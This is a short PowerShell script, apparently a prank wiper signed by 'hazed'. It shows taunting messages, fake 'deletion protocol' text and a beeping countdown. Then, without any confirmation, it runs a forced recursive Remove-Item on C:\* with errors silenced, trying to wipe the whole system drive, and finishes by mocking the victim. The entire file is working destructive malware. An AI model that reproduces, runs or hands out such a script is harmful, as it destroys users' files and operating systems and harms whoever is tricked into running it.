$host.UI.RawUI.BackgroundColor = "Red"
$host.UI.RawUI.ForegroundColor = "White"
Clear-Host

Write-Host "========================================" -ForegroundColor Black -BackgroundColor Yellow
Write-Host "   Upss bro sorry for u PC LMFAO!   " -ForegroundColor Black -BackgroundColor Yellow
Write-Host "========================================" -ForegroundColor Black -BackgroundColor Yellow
Write-Host ""
Write-Host "WARNING: This will DELETE ALL files on C:\" -ForegroundColor Yellow
Write-Host "If you are not sure, CLOSE THIS WINDOW NOW." -ForegroundColor Yellow
Write-Host ""

Write-Host "`nINITIATING DELETION PROTOCOL..." -ForegroundColor Black -BackgroundColor White
Start-Sleep -Seconds 1
for ($i=0; $i -lt 25; $i++) {
    $line = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 60 | ForEach-Object {[char]$_})
    Write-Host $line -ForegroundColor (Get-Random -Minimum 2 -Maximum 15)
    Start-Sleep -Milliseconds 30
}

Write-Host "`nEXECUTING IN..." -ForegroundColor Yellow
5..1 | ForEach-Object {
    Write-Host "$_..." -ForegroundColor Red -BackgroundColor White
    [System.Console]::Beep(800 - ($_*100), 200)
    Start-Sleep -Seconds 1
}

Write-Host "`nDELETING EVERYTHING ON C: (this may take a while)" -ForegroundColor Black -BackgroundColor Red
Remove-Item -Path C:\* -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "`nSorry, hazed has just destroyed your operating system." -ForegroundColor Yellow -BackgroundColor DarkRed
Write-Host "Cheer up, just install another one!" -ForegroundColor Yellow -BackgroundColor DarkRed

Write-Host "`nPress Enter to close" -ForegroundColor Green
Read-Host